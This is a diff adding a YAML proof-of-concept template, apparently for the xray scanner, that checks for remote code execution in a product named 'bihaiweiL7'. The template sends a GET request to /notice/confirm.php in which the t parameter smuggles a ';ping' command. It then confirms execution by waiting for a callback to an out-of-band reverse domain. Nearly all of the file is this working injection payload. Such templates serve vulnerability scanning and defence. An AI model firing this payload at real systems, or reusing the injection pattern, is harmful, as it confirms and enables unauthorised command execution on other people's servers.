@@ -1,0 +1,19 @@
+name: poc-yaml-bihaiweiL7-confirm-RCE
+transport: http
+
+set:
+  reverse: newReverse()
+  reverseDomain: reverse.domain
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /notice/confirm.php?t=%3Bping%20{{reverseDomain}}
+    expression: reverse.wait(1)
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139086073
